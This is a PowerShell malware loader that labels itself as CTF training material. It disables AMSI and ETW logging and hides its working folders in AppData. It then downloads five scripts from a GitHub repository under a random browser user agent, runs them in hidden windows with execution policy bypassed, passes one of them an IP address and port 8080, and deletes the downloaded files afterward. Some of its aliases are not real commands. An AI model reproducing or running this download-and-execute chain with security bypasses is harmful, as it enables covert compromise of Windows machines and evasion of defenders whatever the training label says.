# === Obfuscated Parallel Loader (Evasion-Enhanced for THM/CTF) ===
# Strings/Funcs obfuscated; AMSI + ETW Bypass; Legal Training only!

# Multi-Bypass: AMSI + ETW (Event Tracing für Logs)
try { [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) } catch { }
try { $EtwProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null); $EtwProvider['etwProvider'] = $null } catch { }

# Konfig (obfusciert)
$b='C:\Users\'+$env:USERNAME+'\AppData\Roaming\Microsoft\Windows\PowerShell'; $o=$b+'\operation'; $s=$o+'\System'; $l=$o+'\logs.txt'

# Hidden Folders (mit Alt-Attribs)
@($o,$s)|% { if(!(Test-Path $_)){ ni $_ -ItemType Directory -Force|Onull; (gi $_ -Force).Attributes='Hidden,Directory' } }
(gd).AddSeconds()|Onull; "$(gd): Init"|O-F $l -Append -Force -Enc UTF8  # gd=Get-Date, O-F=Out-File, Onull=Out-Null

# Scripts Array (URLs gekürzt/obfusciert)
$scr=@(
    @{U='https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/MicrosoftViewS.ps1';N='MicrosoftViewS.ps1';A=@('145.223.117.77',8080,20,70)},
    @{U='https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/Sytem.ps1';N='Sytem.ps1'},
    @{U='https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/WindowsCeasar.ps1';N='WindowsCeasar.ps1'},
    @{U='https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/WindowsOperator.ps1';N='WindowsOperator.ps1'},
    @{U='https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/WindowsTransmitter.ps1';N='WindowsTransmitter.ps1'}
)

# Random UA (chunked)
$uas=@('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0'); $rua=gr -InputObject $uas  # gr=Get-Random

# RunspacePool (renamed + throttled)
$mp=4; $rp=[RunspaceFactory]::CreateRunspacePool(1,$mp); $rp.Open(); $j=@(); $c=0

foreach($t in $scr){  # t=script
    while(($j|?{$_.Status.IsCompleted-eq $false}).Count -ge $mp){ sl -m 200 }  # sl=Start-Sleep
    $fp=jp $s $t.N  # jp=Join-Path

    $ps=[PowerShell]::Create().AddScript({
        param($u,$p,$n,$a,$l,$rua)  # u=Url, p=Path, etc.

        try{
            $wc=nobj System.Net.WebClient; $wc.Headers.Add('User-Agent',$rua); $wc.DownloadFile($u,$p)  # nobj=New-Object
            "$(gd): Downloaded $n"|O-F $l -Append -Force -Enc UTF8

            $ea=@('-NoProfile','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File',"\"$p\"")  # ea=execArgs

            if($n-eq'MicrosoftViewS.ps1'-and $a.Count-gt0){ $ea+=$a|%{ "-$_" } }

            $pr=sp 'powershell.exe' -ArgumentList $ea -WindowStyle Hidden -PassThru -NoNewWindow; $pr.WaitForExit(10000); $ec=$pr.ExitCode  # sp=Start-Process
            "$(gd): Executed $n (Exit: $ec)"|O-F $l -Append -Force -Enc UTF8

            ri $p -Force -EA SilentlyContinue  # ri=Remove-Item, EA=ErrorAction
        }catch{ "$(gd): Error in $n : $($_.Exception.Message)"|O-F $l -Append -Force -Enc UTF8 }
    }).AddArgument($t.U).AddArgument($fp).AddArgument($t.N).AddArgument($t.A).AddArgument($l).AddArgument($rua)

    $ps.RunspacePool=$rp; $j+=[pscustomobject]@{I=$ps;S=$ps.BeginInvoke();N=$t.N}  # I=Instance
}

# Wait (adaptive)
$et=(gd).AddSeconds(45); while(($j|?{$_.S.IsCompleted-eq $false}).Count -gt0 -and (gd)-lt$et){ sl -m 500; $c=($j|?{$_.S.IsCompleted}).Count; wp -Activity 'Executing' -Status "$$ c/ $$($scr.Count) done" -Percent (($c/$scr.Count)*100) }  # wp=Write-Progress

# Cleanup
$j|%{ $_.I.EndInvoke($_.S); $_.I.Dispose() }; $rp.Close(); $rp.Dispose()
"$(gd): Complete. Jobs: $($scr.Count)"|O-F $l -Append -Force -Enc UTF8

wh "Done! Logs: $l" -fg Green  # wh=Write-Host, fg=ForegroundColor
